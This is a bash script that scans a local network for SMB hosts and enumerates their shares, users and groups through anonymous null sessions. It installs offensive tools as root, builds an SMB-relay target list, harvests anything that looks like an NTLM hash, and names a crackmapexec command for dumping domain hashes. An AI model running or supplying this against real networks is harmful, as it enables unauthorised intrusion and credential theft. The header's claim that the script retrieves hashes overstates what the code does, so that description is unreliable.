#!/bin/bash
# SMB Enumeration Script - Bash Version
# This script scans the LAN for SMB hosts, enumerates workgroups/domains, users, shares,
# and attempts to retrieve NTLM hashes via null sessions or open shares.
# Results are saved in plaintext log files.

# Ensure running as root (for installing tools or certain scans)
if [ "$(id -u)" -ne 0 ]; then
  echo "[!] This script must be run as root (sudo)." 
  exit 1
fi

# Variables
NETWORK="192.168.1.0/24"      # Target network range (modify as needed)
HOSTS_LOG="smb_hosts.log"     # Log file for discovered SMB hosts
ENUM_LOG="smb_enum.log"       # Log file for enumeration details
HASHES_LOG="ntlm_hashes.log"  # Log file for NTLM hashes found

# Start fresh logs
> "$HOSTS_LOG"
> "$ENUM_LOG"
> "$HASHES_LOG"

echo "[*] Installing required tools if not present..."
# List of required tools
tools=(nmap smbclient rpcclient enum4linux crackmapexec smbmap)
for tool in "${tools[@]}"; do
  if ! command -v "$tool" &>/dev/null; then
    echo "[-] $tool not found, installing..."
    apt-get update -y && apt-get install -y "$tool"
  fi
done

echo "[*] Scanning network $NETWORK for SMB (ports 139,445)..."
# Use nmap to find hosts with SMB ports open
nmap -p139,445 --open -Pn -n -oG smb_scan.gnmap "$NETWORK" >/dev/null 2>&1
# Grepable output to extract IPs with open ports
SMB_HOSTS=$(grep "Ports: 139/open\\|445/open" smb_scan.gnmap | cut -d ' ' -f2)
if [ -z "$SMB_HOSTS" ]; then
  echo "[!] No SMB hosts found on network."
else
  echo "[*] SMB hosts found:" | tee -a "$HOSTS_LOG"
  for ip in $SMB_HOSTS; do
    echo "    $ip" | tee -a "$HOSTS_LOG"
  done
fi

# Enumerate each discovered SMB host
for ip in $SMB_HOSTS; do
  echo -e "\n===== Enumerating host $ip =====" | tee -a "$ENUM_LOG"
  
  # 1. Get NetBIOS names and workgroup/domain info
  echo "[*] Querying NetBIOS for $ip..." | tee -a "$ENUM_LOG"
  nmblookup -A $ip 2>/dev/null | tee -a "$ENUM_LOG"
  
  # 2. List shares via smbclient (anonymous login)
  echo "[*] Listing shares on $ip with smbclient (no credentials)..." | tee -a "$ENUM_LOG"
  smbclient -L "//$ip/" -N -g 2>/dev/null | tee -a "$ENUM_LOG"
  # The -N option uses an anonymous (null) login; -g gives machine-readable output
  
  # 3. Enumerate shares and permissions via smbmap (using guest/anon)
  echo "[*] Checking share accessibility on $ip with smbmap..." | tee -a "$ENUM_LOG"
  smbmap -H $ip -u "guest" -p "" 2>/dev/null | tee -a "$ENUM_LOG"
  
  # 4. Use rpcclient with a null session to enumerate users and groups (if possible)
  echo "[*] Trying null session RPC enumeration on $ip..." | tee -a "$ENUM_LOG"
  rpcclient -U "" -N $ip -c "srvinfo; enumdomusers; enumdomgroups" 2>/dev/null | tee -a "$ENUM_LOG"
  # 'srvinfo' gives server OS info; 'enumdomusers' lists user accounts (with RIDs) if allowed; 'enumdomgroups' lists groups.
  
  # 5. Use enum4linux for comprehensive enumeration (users, shares, OS info)
  echo "[*] Running enum4linux on $ip for comprehensive data..." | tee -a "$ENUM_LOG"
  enum4linux -a $ip 2>/dev/null | tee -a "$ENUM_LOG"
  
  # 6. Attempt to retrieve password hashes via open pipes or shares
  # Try using crackmapexec to dump hashes (if credentials or null session works)
  echo "[*] Attempting to retrieve NTLM hashes from $ip (if accessible)..." | tee -a "$ENUM_LOG"
  crackmapexec smb $ip --gen-relay-list tmp_cme.txt 2>/dev/null | tee -a "$ENUM_LOG"
  # The above checks if SMB signing is off (a potential for relay attacks); adjust as needed for dumping
  # If we had credentials, we could use: crackmapexec smb $ip -u <user> -p <pass> --ntds to dump NTDS.dit (Domain hashes)
  
  # Placeholder: if the script finds any actual hashes (e.g., from a tool output), it appends them to HASHES_LOG.
  # For example, searching enum4linux output for hash-like strings (32 or 64 hex chars).
  grep -E ":[0-9A-Fa-f]{32}:" "$ENUM_LOG" >> "$HASHES_LOG" 2>/dev/null
done

echo "[*] SMB enumeration complete. See $ENUM_LOG for details and $HASHES_LOG for any NTLM hashes."
